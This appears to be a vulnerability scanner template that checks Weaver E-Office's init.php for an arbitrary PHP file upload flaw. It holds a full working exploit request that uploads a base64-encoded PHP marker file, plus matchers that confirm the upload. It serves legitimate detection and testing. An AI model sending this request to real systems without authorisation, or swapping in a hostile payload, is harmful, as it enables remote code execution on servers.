id: poc-yaml-weaver-e-office-initphp-anyfile-upload
info:
  name: 泛微E-Office Init.php 任意文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload,e-office

variables:
  filename: "{{rand_text_alphanumeric(6)}}"

http:
  - raw:
      - |
        POST /E-mobile/App/init.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        m=common_Common_Flow&f=flowDo&diff=feedback&RUN_ID=1&USER_ID=1&CONTENT=1&FLOW_ID=1&upload_file=PD9waHAgZWNobyAiMTIzNDU2NzgiO3VubGluayhfX0ZJTEVfXyk7Pz4=&file_name={{filename}}.php
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "?diff"
      - type: word
        words:
          - "{{filename}}.php"
